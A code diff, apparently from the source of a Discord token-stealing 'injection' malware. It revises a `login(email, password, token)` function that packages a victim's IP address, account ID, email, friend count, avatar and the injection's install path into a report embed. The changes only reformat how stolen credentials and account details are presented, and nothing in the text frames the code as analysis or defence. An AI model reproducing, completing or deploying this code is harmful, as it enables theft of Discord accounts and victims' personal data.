@@ -609,8 +609,8 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: 'IP',
-            value: `\`${config.ip}\``,
+            name: 'Info',
+            value: `\`\`\`IP:  \n${config.ip}\n\nInjection Info: \n${__dirname}\n\`\`\``,
             inline: false,
           },
           {
@@ -620,7 +620,7 @@ const login = async (email, password, token) => {
           },
           {  
             name: 'ID',
-            value: `${json.id}`,
+            value: `\`${json.id}\``,
             inline: true,
           },
           {  
@@ -636,7 +636,7 @@ const login = async (email, password, token) => {
           {
             name: 'Friends Total',
             value: `\`${friends}\``,
-            inline: true,
+            inline: false,
           },
           {
             name: 'Email',
@@ -655,7 +655,7 @@ const login = async (email, password, token) => {
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' - ' + json.id,
+          name: 'User Login',
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
